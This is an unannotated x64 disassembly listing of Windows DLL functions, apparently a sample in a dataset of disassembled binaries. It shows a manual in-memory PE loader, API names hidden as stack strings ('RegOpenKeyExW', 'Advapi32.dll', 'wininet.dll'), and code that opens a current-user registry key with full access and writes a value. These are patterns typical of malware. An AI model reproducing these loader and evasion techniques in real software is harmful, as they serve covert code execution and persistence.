mov ecx 0xc1
call [ SetLastError@IAT ]
xor eax eax
add rsp 0x28
pop r14
pop r13
pop r12
pop rbx
retn
mov ecx 0xc1
call [ SetLastError@IAT ]
mov rsi [ rsp + 0x58 ]
xor eax eax
add rsp 0x28
pop r14
pop r13
pop r12
pop rbx
retn
mov eax 0x14c
cmp [ rsi + 0x4 ] ax
jne r-xdata
mov edx [ rsi + 0x50 ]
mov rcx [ rsi + 0x30 ]
mov r9d 0x4
mov r8d 0x3000
mov [ rsp + 0x50 ] rbp
call [ VirtualAlloc@IAT ]
mov rbp rax
test rax rax
jne r-xdata
mov [ rsp + 0x60 ] rdi
call [ GetProcessHeap@IAT ]
xor edx edx
lea r8d [ rdx + 0x50 ]
mov rcx rax
call [ HeapAlloc@IAT ]
mov rdi rax
test rax rax
jne r-xdata
mov edx [ rsi + 0x50 ]
lea r9d [ rax + 0x4 ]
xor ecx ecx
mov r8d 0x3000
call [ VirtualAlloc@IAT ]
mov rbp rax
test rax rax
jne r-xdata
mov [ rax + 0x8 ] rbp
mov [ rsp + 0x20 ] r15
xor r15d r15d
mov [ rax + 0x10 ] r15
mov [ rax + 0x18 ] r15
movzx eax [ rsi + 0x16 ]
shr eax 0xd
mov [ rdi + 0x28 ] r14
mov [ rdi + 0x30 ] r13
and eax 0x1
mov [ rdi + 0x38 ] rbx
lea r9d [ r15 + 0x4 ]
mov [ rdi + 0x20 ] eax
mov rax [ rsp + 0x70 ]
mov r8d 0x1000
mov [ rdi + 0x40 ] rax
mov edx [ rsi + 0x54 ]
mov rcx rbp
call [ VirtualAlloc@IAT ]
mov r8d [ rsi + 0x54 ]
mov rdx r12
mov rcx rax
mov rbx rax
call sub_18001c4a0
movsxd rax [ r12 + 0x3c ]
mov r8 rdi
add rax rbx
mov rdx rsi
mov rcx r12
mov [ rdi ] rax
mov [ rax + 0x30 ] rbp
call sub_1800133e0
mov rdx rbp
sub rdx [ rsi + 0x30 ]
je r-xdata
lea ecx [ rax + 0xe ]
call [ SetLastError@IAT ]
xor edx edx
mov r8d 0x8000
mov rcx rbp
call [ VirtualFree@IAT ]
xor eax eax
jmp r-xdata
lea ecx [ rax + 0xe ]
call [ SetLastError@IAT ]
xor eax eax
jmp r-xdata
mov [ rdi + 0x24 ] 0x1
mov rcx rdi
call sub_1800135e0
mov [ rdi + 0x24 ] eax
jmp r-xdata
mov rdi [ rsp + 0x60 ]
mov rbp [ rsp + 0x50 ]
mov rsi [ rsp + 0x58 ]
add rsp 0x28
pop r14
pop r13
pop r12
pop rbx
retn
mov rcx rdi
call sub_1800138d0
xor eax eax
mov rcx rdi
call sub_1800134d0
mov rax [ rdi ]
mov rsi [ rdi + 0x8 ]
mov ecx [ rax + 0xd0 ]
test ecx ecx
je r-xdata
mov rcx rdi
call sub_1800136a0
test eax eax
je r-xdata
mov rax [ rdi ]
mov ecx [ rax + 0x28 ]
test ecx ecx
je r-xdata
mov rbx [ rcx + rsi + 0x18 ]
test rbx rbx
je r-xdata
mov [ rdi + 0x48 ] r15
mov rax rdi
jmp r-xdata
lea rax [ rbp + rcx ]
cmp [ rdi + 0x20 ] r15d
je r-xdata
mov rax [ rbx ]
test rax rax
je r-xdata
mov r15 [ rsp + 0x20 ]
mov [ rdi + 0x48 ] rax
mov rax rdi
jmp r-xdata
xor r8d r8d
mov rcx rbp
lea edx [ r8 + 0x1 ]
call rax
test eax eax
jne r-xdata
nop [ rax ] eax
mov [ rdi + 0x1c ] 0x1
mov rax rdi
jmp r-xdata
mov ecx 0x45a
call [ SetLastError@IAT ]
xor r8d r8d
mov rcx rsi
lea edx [ r8 + 0x1 ]
call rax
mov rax [ rbx + 0x8 ]
add rbx 0x8
test rax rax
jne r-xdata
sub_180013c70
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rbx rdx
mov rdi rcx
mov edx 0x1
mov rcx rbx
call sub_180013870
mov edx 0x2
mov rcx rbx
mov [ rdi + 0x10 ] rax
call sub_180013870
mov edx 0x3
mov rcx rbx
mov [ rdi + 0x18 ] rax
call sub_180013870
mov edx 0x4
mov rcx rbx
mov [ rdi + 0x20 ] rax
call sub_180013870
mov edx 0x5
mov rcx rbx
mov [ rdi + 0x28 ] rax
call sub_180013870
mov edx 0x6
mov rcx rbx
mov [ rdi + 0x30 ] rax
call sub_180013870
mov edx 0x7
mov rcx rbx
mov [ rdi + 0x48 ] rax
call sub_180013870
mov edx 0x8
mov rcx rbx
mov [ rdi + 0x50 ] rax
call sub_180013870
mov edx 0x9
mov rcx rbx
mov [ rdi + 0x38 ] rax
call sub_180013870
cmp [ rdi + 0x10 ] 0x0
mov [ rdi + 0x40 ] rax
je r-xdata
xor al al
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
cmp [ rdi + 0x18 ] 0x0
je r-xdata
cmp [ rdi + 0x20 ] 0x0
je r-xdata
cmp [ rdi + 0x28 ] 0x0
je r-xdata
cmp [ rdi + 0x30 ] 0x0
je r-xdata
cmp [ rdi + 0x48 ] 0x0
je r-xdata
cmp [ rdi + 0x50 ] 0x0
je r-xdata
cmp [ rdi + 0x38 ] 0x0
je r-xdata
test rax rax
je r-xdata
mov al 0x1
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
sub_180013d70
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rax [ r--data ]
mov ebx edx
mov rdi rcx
mov [ rcx ] rax
call sub_180012ba0
test bl 0x1
je r-xdata
mov rax rdi
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rdi
call j_sub_18001c80c
sub_180013de0
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rbx rdx
mov rdi rcx
mov edx 0x1
mov rcx rbx
call sub_180013870
mov edx 0x2
mov rcx rbx
mov [ rdi + 0x40 ] rax
call sub_180013870
mov edx 0x3
mov rcx rbx
mov [ rdi + 0x48 ] rax
call sub_180013870
mov edx 0x4
mov rcx rbx
mov [ rdi + 0x60 ] rax
call sub_180013870
mov edx 0x5
mov rcx rbx
mov [ rdi + 0x50 ] rax
call sub_180013870
mov edx 0x6
mov rcx rbx
mov [ rdi + 0x58 ] rax
call sub_180013870
mov edx 0x7
mov rcx rbx
mov [ rdi + 0x68 ] rax
call sub_180013870
cmp [ rdi + 0x40 ] 0x0
mov [ rdi + 0x70 ] rax
je r-xdata
xor al al
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
cmp [ rdi + 0x48 ] 0x0
je r-xdata
cmp [ rdi + 0x60 ] 0x0
je r-xdata
cmp [ rdi + 0x50 ] 0x0
je r-xdata
cmp [ rdi + 0x58 ] 0x0
je r-xdata
cmp [ rdi + 0x68 ] 0x0
je r-xdata
test rax rax
je r-xdata
mov al 0x1
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
sub_180013eb0
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rax [ r--data ]
mov ebx edx
mov rdi rcx
mov [ rcx ] rax
call sub_180013220
test bl 0x1
je r-xdata
mov rax rdi
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rdi
call j_sub_18001c80c
sub_180013f90
mov [ rsp + 0x18 ] rbx
push rsi
mov rbx r9
mov rsi rdx
mov r11 rcx
test r9 r9
jne r-xdata
mov r10 [ rcx + 0x10 ]
mov [ rsp + 0x10 ] rdi
mov [ rsp + 0x18 ] r12
or r12 0xffffffffffffffff
cmp r8 r10
jae r-xdata
cmp r8 [ rcx + 0x10 ]
ja r-xdata
mov rdi [ rsp + 0x10 ]
mov rax r12
mov r12 [ rsp + 0x18 ]
mov rbx [ rsp + 0x20 ]
pop rsi
retn
sub r10 r8
cmp rbx r10
ja r-xdata
mov rax r8
mov rbx [ rsp + 0x20 ]
pop rsi
retn
mov eax 0x1
sub rax rbx
add r10 rax
cmp [ rcx + 0x18 ] 0x8
jb r-xdata
mov rax rcx
mov rax [ rcx ]
jmp r-xdata
movzx ecx [ rsi ]
nop
lea rdi [ rax + r8 * 2 ]
test rdx rdx
je r-xdata
add rdx 0x2
dec rax
jne r-xdata
mov rcx rbx
mov r8 rsi
mov r9 rdx
test rbx rbx
je r-xdata
cmp [ rdx ] cx
je r-xdata
cmp [ r11 + 0x18 ] 0x8
jb r-xdata
movzx eax [ r8 ]
cmp [ r9 ] ax
jne r-xdata
mov rdi [ rsp + 0x10 ]
mov r12 [ rsp + 0x18 ]
mov rbx [ rsp + 0x20 ]
sub rdx r11
sar rdx 0x1
mov rax rdx
pop rsi
retn
mov r11 [ r11 ]
cmp [ r9 ] ax
mov ecx 0x1
cmovb ecx r12d
test ecx ecx
je r-xdata
add r9 0x2
add r8 0x2
dec rcx
jne r-xdata
mov rcx rdx
mov rax r12
sub rcx rdi
lea rdi [ rdx + 0x2 ]
sar rcx 0x1
sub rax rcx
add r10 rax
jmp r-xdata
mov rax r10
mov rdx rdi
test r10 r10
je r-xdata
sub_1800140a0
sub rsp 0x48
xor eax eax
test rdx rdx
je r-xdata
add rsp 0x48
retn
mov rax 0x333333333333333
cmp rdx rax
ja r-xdata
lea rdx [ rsp + 0x58 ]
lea rcx [ rsp + 0x20 ]
mov [ rsp + 0x58 ] 0x0
call sub_18001c398
lea r11 [ r--data ]
lea rdx [ r--data ]
lea rcx [ rsp + 0x20 ]
mov [ rsp + 0x20 ] r11
call sub_18001c8f0
int3
lea rcx [ rdx + rdx * 4 ]
shl rcx 0x4
call sub_18001c84c
test rax rax
jne r-xdata
sub_180014110
mov [ rsp + 0x8 ] rbx
cmp [ rdx + 0x18 ] 0x8
mov r11 [ rdx + 0x10 ]
jb r-xdata
mov r9 [ rcx + 0x10 ]
cmp r9 r9
cmp [ rcx + 0x18 ] 0x8
jb r-xdata
mov rdx [ rdx ]
cmp r9 r11
mov r8 r11
cmovb r8 r9
xor r10d r10d
or ebx 0xffffffff
test r8 r8
je r-xdata
mov rcx [ rcx ]
mov r8d r10d
nop [ rax ] eax
mov rbx [ rsp + 0x8 ]
retn
cmp r9 r11
jae r-xdata
cmp [ rcx ] ax
mov r8d 0x1
cmovb r8d ebx
jmp r-xdata
add rcx 0x2
add rdx 0x2
dec r8
jne r-xdata
setne r10b
mov eax r10d
mov eax ebx
mov rbx [ rsp + 0x8 ]
retn
movsxd rax r8d
test r8d r8d
jne r-xdata
movzx eax [ rdx ]
cmp [ rcx ] ax
jne r-xdata
sub_1800141a0
push rdi
mov r11 r8
mov rdi rdx
mov r9 rcx
cmp rcx rdx
je r-xdata
mov rax rcx
pop rdi
retn
mov [ rsp + 0x10 ] rbx
mov rbx [ r8 + 0x10 ]
mov [ rsp + 0x18 ] rbp
mov [ rsp + 0x20 ] rsi
mov rsi [ r8 + 0x18 ]
or ebp 0xffffffff
nop
mov rdx r11
mov rdx [ r11 ]
jmp r-xdata
mov rcx r9
mov rcx [ r9 ]
jmp r-xdata
mov r10 [ r9 + 0x10 ]
cmp r10 r10
cmp [ r9 + 0x18 ] 0x8
jb r-xdata
xor r8d r8d
movzx eax [ rdx ]
cmp [ rcx ] ax
jne r-xdata
cmp r10 rbx
mov r8 rbx
cmovb r8 r10
test r8 r8
je r-xdata
test eax eax
je r-xdata
cmp r10 rbx
jb r-xdata
cmp [ rcx ] ax
mov r8d 0x1
cmovb r8d ebp
jmp r-xdata
add rcx 0x2
add rdx 0x2
dec r8
jne r-xdata
mov rbp [ rsp + 0x18 ]
mov rbx [ rsp + 0x10 ]
mov rsi [ rsp + 0x20 ]
mov rax r9
pop rdi
retn
add r9 0x28
cmp r9 rdi
jne r-xdata
xor eax eax
cmp r10 rbx
setne al
movsxd rax r8d
test r8d r8d
jne r-xdata
cmp rsi 0x8
jb r-xdata
sub_180014270
push r12
sub rsp 0x10
mov r9 [ rcx + 0xf8 ]
mov rdx [ rcx + 0x100 ]
mov [ rsp + 0x30 ] rsi
sub rdx r9
mov rax 0x6666666666666667
xor r11d r11d
mov r12 rcx
imul rdx
mov rsi rdx
sar rsi 0x4
mov rax rsi
shr rax 0x3f
add rsi rax
je r-xdata
cmp r11 rsi
mov rsi [ rsp + 0x30 ]
jne r-xdata
mov [ rsp + 0x20 ] rbx
mov [ rsp + 0x28 ] rbp
mov rbp [ rcx + 0x28 ]
mov [ rsp + 0x8 ] rdi
mov rdi [ rcx + 0x20 ]
mov [ rsp ] r13
or r13d 0xffffffff
cmp r11 [ r12 + 0x38 ]
setne al
add rsp 0x10
pop r12
retn
mov al 0x1
add rsp 0x10
pop r12
retn
lea rdx [ r12 + 0x10 ]
mov rdx [ r12 + 0x10 ]
jmp r-xdata
mov rcx r9
mov rcx [ r9 ]
jmp r-xdata
mov r10 [ r9 + 0x10 ]
cmp r10 r10
cmp [ r9 + 0x18 ] 0x8
jb r-xdata
xor r8d r8d
nop [ rax ] eax
cmp r10 rdi
mov r8 rdi
cmovb r8 r10
test r8 r8
je r-xdata
test eax eax
je r-xdata
cmp r10 rdi
jb r-xdata
cmp [ rcx ] ax
mov r8d 0x1
cmovb r8d r13d
jmp r-xdata
add rcx 0x2
add rdx 0x2
dec r8
jne r-xdata
mov rdi [ rsp + 0x8 ]
mov rbp [ rsp + 0x28 ]
mov rbx [ rsp + 0x20 ]
mov r13 [ rsp ]
inc r11
add r9 0x28
cmp r11 rsi
jb r-xdata
xor eax eax
cmp r10 rdi
setne al
movsxd rax r8d
test r8d r8d
jne r-xdata
movzx eax [ rdx ]
cmp [ rcx ] ax
jne r-xdata
cmp rbp 0x8
jb r-xdata
sub_1800143a0
sub rsp 0x8
mov r11 rdx
mov r8 rcx
cmp rcx rdx
je r-xdata
mov rax rcx
add rsp 0x8
retn
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rsi
or rsi 0xffffffffffffffff
mov [ rsp ] rdi
lea rbx [ rw-data ]
xor eax eax
mov rdi rbx
mov rcx rsi
[ rdi ]
not rcx
lea r10 [ rcx - 0x1 ]
nop
mov rdx r8
mov rdx [ r8 ]
jmp r-xdata
xor edi edi
movzx eax [ rcx ]
cmp [ rdx ] ax
jne r-xdata
cmp r9 r10
mov rdi r10
mov rcx rbx
cmovb rdi r9
test rdi rdi
je r-xdata
test eax eax
je r-xdata
cmp r9 r10
jb r-xdata
cmp [ rdx ] ax
mov edi 0x1
cmovb edi esi
jmp r-xdata
add rdx 0x2
add rcx 0x2
dec rdi
jne r-xdata
mov rsi [ rsp + 0x18 ]
mov rbx [ rsp + 0x10 ]
mov rdi [ rsp ]
mov rax r8
add rsp 0x8
retn
add r8 0x50
cmp r8 r11
jne r-xdata
xor eax eax
cmp r9 r10
setne al
movsxd rax edi
test edi edi
jne r-xdata
cmp [ r8 + 0x18 ] 0x8
mov r9 [ r8 + 0x10 ]
jb r-xdata
sub_180014470
sub rsp 0x8
mov r11 rdx
mov r8 rcx
cmp rcx rdx
je r-xdata
mov rax rcx
add rsp 0x8
retn
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rsi
or rsi 0xffffffffffffffff
mov [ rsp ] rdi
lea rbx [ rw-data ]
xor eax eax
mov rdi rbx
mov rcx rsi
[ rdi ]
not rcx
lea r10 [ rcx - 0x1 ]
nop
mov rdx r8
mov rdx [ r8 ]
jmp r-xdata
xor edi edi
movzx eax [ rcx ]
cmp [ rdx ] ax
jne r-xdata
cmp r9 r10
mov rdi r10
mov rcx rbx
cmovb rdi r9
test rdi rdi
je r-xdata
test eax eax
je r-xdata
cmp r9 r10
jb r-xdata
cmp [ rdx ] ax
mov edi 0x1
cmovb edi esi
jmp r-xdata
add rdx 0x2
add rcx 0x2
dec rdi
jne r-xdata
mov rsi [ rsp + 0x18 ]
mov rbx [ rsp + 0x10 ]
mov rdi [ rsp ]
mov rax r8
add rsp 0x8
retn
add r8 0x50
cmp r8 r11
jne r-xdata
xor eax eax
cmp r9 r10
setne al
movsxd rax edi
test edi edi
jne r-xdata
cmp [ r8 + 0x18 ] 0x8
mov r9 [ r8 + 0x10 ]
jb r-xdata
sub_180014540
sub rsp 0x8
mov r11 rdx
mov r8 rcx
cmp rcx rdx
je r-xdata
mov rax rcx
add rsp 0x8
retn
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rsi
or rsi 0xffffffffffffffff
mov [ rsp ] rdi
lea rbx [ rw-data ]
xor eax eax
mov rdi rbx
mov rcx rsi
[ rdi ]
not rcx
lea r10 [ rcx - 0x1 ]
nop
mov rdx r8
mov rdx [ r8 ]
jmp r-xdata
xor edi edi
movzx eax [ rcx ]
cmp [ rdx ] ax
jne r-xdata
cmp r9 r10
mov rdi r10
mov rcx rbx
cmovb rdi r9
test rdi rdi
je r-xdata
test eax eax
je r-xdata
cmp r9 r10
jb r-xdata
cmp [ rdx ] ax
mov edi 0x1
cmovb edi esi
jmp r-xdata
add rdx 0x2
add rcx 0x2
dec rdi
jne r-xdata
mov rsi [ rsp + 0x18 ]
mov rbx [ rsp + 0x10 ]
mov rdi [ rsp ]
mov rax r8
add rsp 0x8
retn
add r8 0x50
cmp r8 r11
jne r-xdata
xor eax eax
cmp r9 r10
setne al
movsxd rax edi
test edi edi
jne r-xdata
cmp [ r8 + 0x18 ] 0x8
mov r9 [ r8 + 0x10 ]
jb r-xdata
sub_180014610
sub rsp 0x8
mov r11 rdx
mov r8 rcx
cmp rcx rdx
je r-xdata
mov rax rcx
add rsp 0x8
retn
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rsi
or rsi 0xffffffffffffffff
mov [ rsp ] rdi
lea rbx [ rw-data ]
xor eax eax
mov rdi rbx
mov rcx rsi
[ rdi ]
not rcx
lea r10 [ rcx - 0x1 ]
nop
mov rdx r8
mov rdx [ r8 ]
jmp r-xdata
xor edi edi
movzx eax [ rcx ]
cmp [ rdx ] ax
jne r-xdata
cmp r9 r10
mov rdi r10
mov rcx rbx
cmovb rdi r9
test rdi rdi
je r-xdata
test eax eax
je r-xdata
cmp r9 r10
jb r-xdata
cmp [ rdx ] ax
mov edi 0x1
cmovb edi esi
jmp r-xdata
add rdx 0x2
add rcx 0x2
dec rdi
jne r-xdata
mov rsi [ rsp + 0x18 ]
mov rbx [ rsp + 0x10 ]
mov rdi [ rsp ]
mov rax r8
add rsp 0x8
retn
add r8 0x50
cmp r8 r11
jne r-xdata
xor eax eax
cmp r9 r10
setne al
movsxd rax edi
test edi edi
jne r-xdata
cmp [ r8 + 0x18 ] 0x8
mov r9 [ r8 + 0x10 ]
jb r-xdata
sub_1800146e0
sub rsp 0x8
mov r11 rdx
mov r8 rcx
cmp rcx rdx
je r-xdata
mov rax rcx
add rsp 0x8
retn
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rsi
or rsi 0xffffffffffffffff
mov [ rsp ] rdi
lea rbx [ rw-data ]
xor eax eax
mov rdi rbx
mov rcx rsi
[ rdi ]
not rcx
lea r10 [ rcx - 0x1 ]
nop
mov rdx r8
mov rdx [ r8 ]
jmp r-xdata
xor edi edi
movzx eax [ rcx ]
cmp [ rdx ] ax
jne r-xdata
cmp r9 r10
mov rdi r10
mov rcx rbx
cmovb rdi r9
test rdi rdi
je r-xdata
test eax eax
je r-xdata
cmp r9 r10
jb r-xdata
cmp [ rdx ] ax
mov edi 0x1
cmovb edi esi
jmp r-xdata
add rdx 0x2
add rcx 0x2
dec rdi
jne r-xdata
mov rsi [ rsp + 0x18 ]
mov rbx [ rsp + 0x10 ]
mov rdi [ rsp ]
mov rax r8
add rsp 0x8
retn
add r8 0x50
cmp r8 r11
jne r-xdata
xor eax eax
cmp r9 r10
setne al
movsxd rax edi
test edi edi
jne r-xdata
cmp [ r8 + 0x18 ] 0x8
mov r9 [ r8 + 0x10 ]
jb r-xdata
sub_1800147b0
sub rsp 0x8
mov r11 rdx
mov r8 rcx
cmp rcx rdx
je r-xdata
mov rax rcx
add rsp 0x8
retn
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rsi
or rsi 0xffffffffffffffff
mov [ rsp ] rdi
lea rbx [ rw-data ]
xor eax eax
mov rdi rbx
mov rcx rsi
[ rdi ]
not rcx
lea r10 [ rcx - 0x1 ]
nop
mov rdx r8
mov rdx [ r8 ]
jmp r-xdata
xor edi edi
movzx eax [ rcx ]
cmp [ rdx ] ax
jne r-xdata
cmp r9 r10
mov rdi r10
mov rcx rbx
cmovb rdi r9
test rdi rdi
je r-xdata
test eax eax
je r-xdata
cmp r9 r10
jb r-xdata
cmp [ rdx ] ax
mov edi 0x1
cmovb edi esi
jmp r-xdata
add rdx 0x2
add rcx 0x2
dec rdi
jne r-xdata
mov rsi [ rsp + 0x18 ]
mov rbx [ rsp + 0x10 ]
mov rdi [ rsp ]
mov rax r8
add rsp 0x8
retn
add r8 0x50
cmp r8 r11
jne r-xdata
xor eax eax
cmp r9 r10
setne al
movsxd rax edi
test edi edi
jne r-xdata
cmp [ r8 + 0x18 ] 0x8
mov r9 [ r8 + 0x10 ]
jb r-xdata
sub_180014880
mov rax rsp
push rbp
lea rbp [ rax - 0x5f ]
sub rsp 0xd0
mov [ rbp - 0x29 ] 0xfffffffffffffffe
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rdi
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x4f ] rax
mov ecx 0x30
call sub_18001c84c
mov [ rbp - 0x31 ] rax
xor edi edi
test rax rax
je r-xdata
mov rbx rdi
mov rcx rax
call sub_180008850
mov rbx rax
jmp r-xdata
mov [ rbp + 0x3f ] 0x4f676552
mov [ rbp + 0x43 ] 0x4b6e6570
mov [ rbp + 0x47 ] 0x78457965
mov [ rbp + 0x4b ] 0x57
lea rdx [ rbp + 0x3f ]
mov rcx rax
call [ GetProcAddress@IAT ]
test rax rax
jne r-xdata
lea rcx [ rbp + 0x2f ]
call [ LoadLibraryA@IAT ]
test rax rax
jne r-xdata
mov r8d 0xb
lea rdx [ rw-data ]
mov rcx rbx
call sub_1800088d0
mov r8d 0x78
lea rdx [ rw-data ]
mov rcx rbx
call sub_1800088c0
lea rdx [ rbp + 0x7 ]
mov rcx rbx
call sub_1800092e0
nop
mov [ rbp - 0x41 ] rdi
mov [ rbp + 0x2f ] 0x61766441
mov [ rbp + 0x33 ] 0x32336970
mov [ rbp + 0x37 ] 0x6c6c642e
mov [ rbp + 0x3b ] 0x0
lea rcx [ rbp + 0x2f ]
call [ GetModuleHandleA@IAT ]
test rax rax
jne r-xdata
lea rdx [ rbp + 0x7 ]
cmp [ rbp + 0x1f ] 0x8
cmovae rdx [ rbp + 0x7 ]
lea rcx [ rbp - 0x41 ]
mov [ rsp + 0x20 ] rcx
mov r9d 0xf003f
xor r8d r8d
mov rcx 0xffffffff80000001
call rax
cmp eax 0x2
jne r-xdata
cmp [ rbp + 0x1f ] 0x8
jb r-xdata
cmp [ rbp + 0x1f ] 0x8
jb r-xdata
mov [ rbp - 0x49 ] edi
mov [ rbp - 0x39 ] 0x4
mov r8d 0x24
lea rdx [ rw-data ]
mov rcx rbx
call sub_1800088c0
lea rdx [ rbp - 0x21 ]
mov rcx rbx
call sub_1800092e0
nop
test rbx rbx
je r-xdata
test rbx rbx
je r-xdata
xor al al
jmp r-xdata
mov rcx [ rbp + 0x7 ]
call j_sub_18001c80c
xor al al
jmp r-xdata
mov rcx [ rbp + 0x7 ]
call j_sub_18001c80c
lea rdx [ rbp - 0x21 ]
cmp [ rbp - 0x9 ] 0x8
cmovae rdx [ rbp - 0x21 ]
lea rax [ rbp - 0x39 ]
mov [ rsp + 0x28 ] rax
lea rax [ rbp - 0x49 ]
mov [ rsp + 0x20 ] rax
xor r9d r9d
xor r8d r8d
mov rcx [ rbp - 0x41 ]
call [ RegQueryValueExW@IAT ]
mov rcx [ rbp - 0x41 ]
test eax eax
je r-xdata
mov rcx rbx
call sub_180008890
mov rcx rbx
call j_sub_18001c80c
cmp [ rbp + 0x1f ] 0x8
jb r-xdata
mov rcx rbx
call sub_180008890
mov rcx rbx
call j_sub_18001c80c
nop
mov rcx [ rbp + 0x4f ]
xor rcx rsp
call sub_18001d1f0
lea r11 [ rsp + 0xd0 ]
mov rbx [ r11 + 0x10 ]
mov rdi [ r11 + 0x18 ]
mov rsp r11
pop rbp
retn
cmp [ rbp - 0x49 ] 0x0
jne r-xdata
call [ RegCloseKey@IAT ]
nop
cmp [ rbp - 0x9 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x7 ]
call j_sub_18001c80c
xor al al
jmp r-xdata
mov [ rbp - 0x49 ] edi
lea rdx [ rbp - 0x21 ]
cmp [ rbp - 0x9 ] 0x8
cmovae rdx [ rbp - 0x21 ]
mov [ rsp + 0x28 ] 0x4
lea rax [ rbp - 0x49 ]
mov [ rsp + 0x20 ] rax
mov r9d 0x4
xor r8d r8d
call [ RegSetValueExW@IAT ]
mov rcx [ rbp - 0x41 ]
test eax eax
je r-xdata
call [ RegCloseKey@IAT ]
nop
cmp [ rbp - 0x9 ] 0x8
jb r-xdata
mov [ rbp - 0x9 ] 0x7
mov [ rbp - 0x11 ] rdi
mov [ rbp - 0x21 ] di
cmp [ rbp + 0x1f ] 0x8
jb r-xdata
mov rcx [ rbp - 0x21 ]
call j_sub_18001c80c
call [ RegCloseKey@IAT ]
nop
cmp [ rbp - 0x9 ] 0x8
jb r-xdata
call [ RegCloseKey@IAT ]
nop
cmp [ rbp - 0x9 ] 0x8
jb r-xdata
mov [ rbp - 0x9 ] 0x7
mov [ rbp - 0x11 ] rdi
mov [ rbp - 0x21 ] di
jmp r-xdata
mov rcx [ rbp - 0x21 ]
call j_sub_18001c80c
mov rcx [ rbp + 0x7 ]
call j_sub_18001c80c
xor al al
jmp r-xdata
mov [ rbp - 0x9 ] 0x7
mov [ rbp - 0x11 ] rdi
mov [ rbp - 0x21 ] di
mov rcx [ rbp - 0x21 ]
call j_sub_18001c80c
mov [ rbp - 0x9 ] 0x7
mov [ rbp - 0x11 ] rdi
mov [ rbp - 0x21 ] di
cmp [ rbp + 0x1f ] 0x8
jb r-xdata
mov rcx [ rbp - 0x21 ]
call j_sub_18001c80c
cmp [ rbp + 0x1f ] 0x8
jb r-xdata
mov al 0x1
mov rcx [ rbp + 0x7 ]
call j_sub_18001c80c
mov rcx [ rbp + 0x7 ]
call j_sub_18001c80c
xor al al
jmp r-xdata
sub_180014bc0
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
cmp [ rcx + 0x40 ] 0x8
mov rbx rcx
jb r-xdata
xor edi edi
mov [ rbx + 0x40 ] 0x7
mov [ rbx + 0x38 ] rdi
mov [ rbx + 0x28 ] di
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov rcx [ rcx + 0x28 ]
call j_sub_18001c80c
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] rdi
mov [ rbx ] di
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx [ rbx ]
call j_sub_18001c80c
sub_180014c20
push rbx
sub rsp 0x20
xor eax eax
mov rbx rdx
mov [ rdx + 0x18 ] 0x7
mov [ rdx + 0x10 ] rax
mov [ rdx ] ax
mov rdx rcx
mov rcx rbx
mov [ rsp + 0x38 ] eax
call sub_180001ac0
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_180014c60
mov [ rsp + 0x18 ] rbx
push rdi
sub rsp 0xc0
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0xb0 ] rax
xor edi edi
mov rbx rcx
mov r9 rdx
lea r8 [ r--data ]
lea rcx [ rsp + 0x30 ]
lea edx [ rdi + 0x40 ]
mov [ rsp + 0x20 ] edi
call sub_180013ef0
mov [ rbx + 0x10 ] rdi
or rcx 0xffffffffffffffff
mov [ rbx + 0x18 ] 0x7
mov [ rbx ] di
xor eax eax
lea rdi [ rsp + 0x30 ]
lea rdx [ rsp + 0x30 ]
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
mov rcx rbx
call sub_180003b50
mov rax rbx
mov rcx [ rsp + 0xb0 ]
xor rcx rsp
call sub_18001d1f0
mov rbx [ rsp + 0xe0 ]
add rsp 0xc0
pop rdi
retn
sub_180014d00
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
lea rbp [ rsp - 0x27 ]
sub rsp 0xd0
mov [ rbp - 0x79 ] 0xfffffffffffffffe
mov [ rsp + 0x110 ] rbx
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x17 ] rax
mov rdi r9
mov rsi r8
mov r14 rdx
mov [ rbp - 0x71 ] r8
mov [ rbp - 0x69 ] r9
mov ecx 0x30
call sub_18001c84c
mov [ rsp + 0x28 ] rax
xor r15d r15d
test rax rax
je r-xdata
mov r12 r15
mov rcx rax
call sub_180008850
mov r12 rax
jmp r-xdata
mov rdx rsi
mov rdx [ rsi ]
jmp r-xdata
mov [ rsp + 0x20 ] r15
mov r8 [ rsi + 0x10 ]
cmp [ rsi + 0x18 ] 0x8
jb r-xdata
mov rdx rdi
mov rdx [ rdi ]
jmp r-xdata
add r8 r8
lea r9 [ rsp + 0x20 ]
mov rcx r12
call sub_1800090b0
mov r13 rax
mov [ rbp - 0x49 ] 0x7
mov [ rbp - 0x51 ] r15
mov [ rbp - 0x61 ] r15w
mov r8 [ rsp + 0x20 ]
mov rdx rax
lea rcx [ rbp - 0x61 ]
call sub_180003b50
nop
mov r8 [ rdi + 0x10 ]
cmp [ rdi + 0x18 ] 0x8
jb r-xdata
mov [ rbp - 0x11 ] 0x696e6977
mov [ rbp - 0xd ] 0x2e74656e
mov [ rbp - 0x9 ] 0x6c6c64
lea rcx [ rbp - 0x11 ]
call [ GetModuleHandleA@IAT ]
test rax rax
jne r-xdata
mov rcx r12
call sub_180008890
mov rcx r12
call j_sub_18001c80c
add r8 r8
